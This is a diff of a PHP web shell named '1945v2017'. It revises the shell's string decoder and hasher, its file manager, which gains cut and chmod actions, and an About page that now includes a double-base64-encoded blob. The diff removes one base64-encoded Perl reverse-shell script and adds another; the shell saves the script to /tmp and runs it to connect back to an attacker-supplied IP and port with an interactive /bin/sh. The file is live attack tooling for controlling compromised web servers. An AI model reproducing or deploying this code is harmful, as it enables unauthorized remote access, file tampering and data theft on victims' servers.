-			break;
-		case 'b64b64':
-			$val = base64_decode(base64_decode($_POST['str']));
-			break;
-		case 'b64str':
-			$val = str_rot13(base64_decode($_POST['str']));
-			break;
-		case 'b64url':
-			$val =urldecode(base64_decode($_POST['str']));
-			break;
-		case 'b64strgz':
-			$val = gzinflate(str_rot13(base64_decode($_POST['str'])));
-			break;
-		case 'b64cuu':
-			$val = convert_uudecode(base64_decode($_POST['str']));
-			break;
-		default:
-			$val = $_POST['str'];
-			break;
+if(isset($_POST['decode'])){$o = $_POST['mode'];switch ($o) {case 'url':$val = urldecode($_POST['str']);break;case 'b64':$val = base64_decode($_POST['str']);break;case 'cuu':$val = convert_uudecode($_POST['str']);break;case 'b64b64':$val = base64_decode(base64_decode($_POST['str']));break;case 'b64str':$val = str_rot13(base64_decode($_POST['str']));break;case 'b64url':$val =urldecode(base64_decode($_POST['str']));break;case 'b64strgz':$val = gzinflate(str_rot13(base64_decode($_POST['str'])));	break;case 'b64cuu':$val = convert_uudecode(base64_decode($_POST['str']));break;default:$val = $_POST['str'];break;
 	}
 }
-if(isset($_POST['hash']))
-{
-	$o = $_POST['mode'];
-	switch ($o) {
-		case 'md2':
-			$val = hash("md2",$_POST['str']);
-			break;
-		case 'md4':
-			$val = hash("md4",$_POST['str']);
-			break;
-		case 'md5':
-			$val = md5($_POST['str']);
-			break;
-		case 'sha1':
-			$val = sha1($_POST['str']);
-			break;
-		case 'sha256':
-			$val = hash("sha256",$_POST['str']);
-			break;
-		case 'sha384':
-			$val =hash("sha384",$_POST['str']);
-			break;
-		case 'sha512':
-			$val=hash("sha512",$_POST['str']);
-			break;
-		case 'crypt':
-			$val =crypt($_POST['str']);
-			break;
-		case 'mdmd5':
-			$val = md5(md5($_POST['str']));
-		default:
-			$val = $_POST['str'];
-			break;
+if(isset($_POST['hash'])){$o = $_POST['mode'];switch ($o) {case 'md2':$val = hash("md2",$_POST['str']);break;case 'md4':$val = hash("md4",$_POST['str']);break;case 'md5':$val = md5($_POST['str']);break;case 'sha1':$val = sha1($_POST['str']);break;case 'sha256':$val = hash("sha256",$_POST['str']);break;case 'sha384':$val =hash("sha384",$_POST['str']);break;case 'sha512':$val=hash("sha512",$_POST['str']);break;case 'crypt':$val =crypt($_POST['str']);break;case 'md':$val = md5(md5($_POST['str']));default:$val = $_POST['str'];break;
 	}
 }
 $html->show($html->h1("<center>String Tools</center>"));
@@ -430,7 +329,7 @@ $html->show($html->h1("<center>String Tools</center>"));
 	}
 	if(isset($_POST['sbc']))
 	{
-		$script_back_connect = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnZWNobyAiKy0tLS0tWyAxOTQ1djIwMTcgc2hlbGwgYzBkZWQgYnkgOiBzaHV0ZG93bjU3IF0tLS0tLSsiJyk7DQpzeXN0ZW0oJ2VjaG8gIistLS0tLS0tLS0tWyA3MnRoIEluZG9uZXNpYSBNZXJkZWthIF0tLS0tLS0tLS0rIiA7IHNsZWVwIDEwJyk7DQpzeXN0ZW0oJy9iaW4vc2ggLWknKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
+		$script_back_connect = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQokc2ggPSAiZXhwb3J0IFRFUk09eHRlcm07UFMxPSdcJFBXRCBbMTk0NXYyMDE3XSA+JztleHBvcnQgUFMxOy9iaW4vc2ggLWkiOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KY29ubmVjdChTT0NLRVQsICRwYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7DQpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7DQpvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7DQpzeXN0ZW0oJ2VjaG8gIistLS0tLVsgMTk0NXYyMDE3IHNoZWxsIGMwZGVkIGJ5IDogc2h1dGRvd241NyBdLS0tLS0rIicpOw0Kc3lzdGVtKCdlY2hvICIrLS0tLS0tLS0tLVsgNzJ0aCBJbmRvbmVzaWEgTWVyZGVrYSBdLS0tLS0tLS0tKyIgOyBbK10gd2FpdCAuLiA7IHNsZWVwIDUnKTsNCnN5c3RlbSgkc2gpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
 		$act->simpantext("/tmp/1945_bc.pl",base64_decode($script_back_connect));
 		$port = $_POST['pbc'];
 		$ip   = $_POST['ipbc'];
@@ -539,6 +438,7 @@ $html->show($html->h1("<center>String Tools</center>"));
 	$html->show($html->h1("About 1945v2017"));
 	$html->show("<b>MerdekaAtoeMati</b><br>");
 	$html->show("<i>1945 shell by : ".$html->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"")."</i>");
+	$html->show(base64_decode(base64_decode("UEhBK1BHSStVSEp2YTJ4aGJXRnphVHd2WWo0OEwzQStEUW84YVQ1TFlXMXBJR0poYm1kellTQkpibVJ2Ym1WemFXRWdaR1Z1WjJGdUlHbHVhU0J0Wlc1cVlYUmhhMkZ1SUd0bGJXVnlaR1ZyWVdGdUlFbHVaRzl1WlhOcFlTdzhZbkkrRFFwSVlXd3RhR0ZzSUdwaGJtY2diV1Z1WjJWdVlXa2djR1Z0YVc1a1lXaGhiaUJyWld0dlpXRnpZV0Z1SUdSaGJpQnNZV2x1TFd4aGFXNDhZbkkrRFFwa2FTQnpaV3hsYm1kbllYSmhhMkZ1SUdSbGJtZGhiaUIwYW1GeVlTQnpZV3R6WVcxaElHUmhiaUJrWVd4aGJTQjBhV1Z0Y0c4Z2FtRnVaeUJ6WlhOcGJtZHJZWFF0YzJsdVoydGhkRzVxWVR4aWNqNE5Dand2YVQ0OFlpQmhiR2xuYmoxeWFXZDBQa1JxWVd0aGNuUmhMREUzTFRBNExURTVORFVnUEdKeVBpQkJkR0Z6SUc1aGJXRWdZbUZ1WjNOaElFbHVaRzl1WlhOcFlUeGljajRnVTI5bGEyRnlibThnTFNCSVlYUjBZVHd2WWo0PQ==")));
 
 
 }elseif($__action__ == "dl")
@@ -589,7 +489,7 @@ foreach($scandir as $d)
 	if(!is_dir("$dir/$d"))continue;
 	if($d == ".")
 	{
-		$f=$html->a(".",".","");
+		$f=$html->a("?__merdeka__=".$dir,".","");
 	}elseif($d == "..")
 	{
 		$f =$html->a("?__merdeka__=".dirname($dir),"..","");
@@ -625,60 +525,49 @@ $option_oo = array(
 	""=>"- action selected files-",
 	"delete"=>"delete",
 	"copy"=>"copy",
-	"extract (.zip)");
+	"cut"=>"cut",
+	"chmod"=>"chmod");
 }else{
 $option_oo = array(
 		""=>"- action selected files-",
 	"paste"=>"paste here",
-	"extract"=>"extract here",
+	"cut"=>"move here",
 	"delete"=>"delete",
-	"copy"=>"copy");
+	"copy"=>"copy",
+	"chmod"=>"chmod",
+	"cancel"=>"UnSelect");
 foreach($_SESSION['files_select'] as $op){$optv.=$html->option($op,basename($op));}
-$view ="File selected : ". $html->select("__action__",$optv,"class=\"input_m\" onclick=\"window.location.href='?__files__=$op&__action__=view'\"");
+$view ="File selected : ". $html->select("__action__",$optv,"class=\"input_m\" ");
+$per = substr(sprintf('%o', fileperms($op)),-4);
 }
-
+$input_chmod = $html->input("text","mode","value=\"".$per."\"","Permission ");
+$input_chmod.= $html->submit("chmod","value=\">>\"");
+$form_chmod = $html->form("POST",$input_chmod);
+if(!empty($_GET['_act'])=="chmod")  $chmod_form = $form_chmod; else ""; 
 foreach($option_oo as $name=>$val){ $opt .= $html->option($name,$val); }
 $select = $html->select("action",$opt,"class=\"input_m\"").$html->submit("sbmt","value=\">>\" ");
-$html->show($html->tr("<td colspan='9'>".$select." ".$view. "</td>"));
-if(isset($_POST['sbmt']))
-{
-	if(!empty($_POST['seldir'])){ $seldir = $_POST['seldir'];
-if($_POST['action']=='delete'){
-			if(is_array($_POST['seldir'])){ foreach($seldir as $deldir){
-					$act->delete($deldir);
-					$html->show("<meta http-equiv='refresh' content='0;url='>"); }
-			}else{
-				$act->delete($seldir);
-				$html->show("<meta http-equiv='refresh' content='0;url='>"); }
-			}
-	}
-	if(!empty($_POST['selfile']))
-	{
-		$selfile = $_POST['selfile'];
-		if($_POST['action']=='copy')
-		{
-			$_SESSION['files_select']= array();
-			$n=0;
-			foreach($_POST['selfile'] as $filesel)
-			{
-				$_SESSION['files_select'][$n++] = $filesel;
-				$html->show("<meta http-equiv='refresh' content='0;url='>");
-			}
-		}elseif($_POST['action']=='delete')
-		{if(is_array($_POST['selfile'])){ foreach($selfile as $delfile){ $act->delete($delfile); $html->show("<meta http-equiv='refresh' content='0;url='>");}}else{$act->delete($selfile); $html->show("<meta http-equiv='refresh' content='0;url='>");}}
-	}
-	if($_POST['action']=='paste')
-	{
-		foreach($_SESSION['files_select'] as $fs)
-		{
-			copy($fs,$dir."/".basename($fs));
-			unset($_SESSION['files_select']);
-			$html->show("<meta http-equiv='refresh' content='0;url='>");
-		}
+$html->show($html->tr("<td colspan='9'>".$select." ".$view. " ".$chmod_form."</td>"));
+if(isset($_POST['sbmt'])){if(!empty($_POST['seldir'])){ $seldir = $_POST['seldir'];if($_POST['action']=='delete'){if(is_array($_POST['seldir'])){ foreach($seldir as $deldir){$act->delete($deldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}else{$act->delete($seldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}
+}
+if(!empty($_POST['selfile'])){ $selfile = $_POST['selfile']; if($_POST['action']=='copy'){$_SESSION['files_select']= array();$n=0;foreach($_POST['selfile'] as $filesel){
+				$_SESSION['files_select'][$n++] = $filesel; $html->show("<meta http-equiv='refresh' content='0;url='>");}}elseif($_POST['action']=='delete'){if(is_array($_POST['selfile'])){ foreach($selfile as $delfile){ $act->delete($delfile); $html->show("<meta http-equiv='refresh' content='0;url='>");}}else{$act->delete($selfile); $html->show("<meta http-equiv='refresh' content='0;url='>");}}elseif($_POST['action']=='extract'){$_SESSION['files_select']=array(); $n=0; foreach($_POST['selfile'] as $filesel){$_SESSION['files_select'][$n++]=$filesel;$html->show("<meta http-equiv='refresh' content='0;url='>");}}elseif($_POST['action']=='chmod'){
+	$_SESSION['files_select']=array();
+	$n=0;
+	foreach($_POST['selfile'] as $pile){$_SESSION['files_select'][$n++]=$pile;} $html->show("<meta http-equiv='refresh' content='0;url=?_act=chmod'>");
+
+ } }
+if($_POST['action']=='paste'){foreach($_SESSION['files_select'] as $fs){copy($fs,$dir."/".basename($fs));unset($_SESSION['files_select']);$html->show("<meta http-equiv='refresh' content='0;url='>");}}
+}
+if($_POST['action']=='cancel'){unset($_SESSION['files_select']); $html->show("<meta http-equiv='refresh' content='0;url='>");}
+if(isset($_POST['chmod'])){
+	$perms = 0;
+	for($i=strlen($_POST['mode'])-1;$i>=0;--$i){
+	$perms += (int)$_POST['mode'][$i]*pow(8, (strlen($_POST['mode'])-$i-1));}
+	foreach($_SESSION['files_select'] as $file_chmod){
+		if(!@chmod($file_chmod,$perms)){$html->show("<script>alert('failed change Permission'); window.location.href='?';</script>");}else{$html->show("<script>alert('Successfuly change Permission!'); window.location.href='?';</script>"); unset($_SESSION['files_select']);}
 	}
 }
-
 $html->show("</table>");
 }
-
+$html->show($html->footer());
 ?>
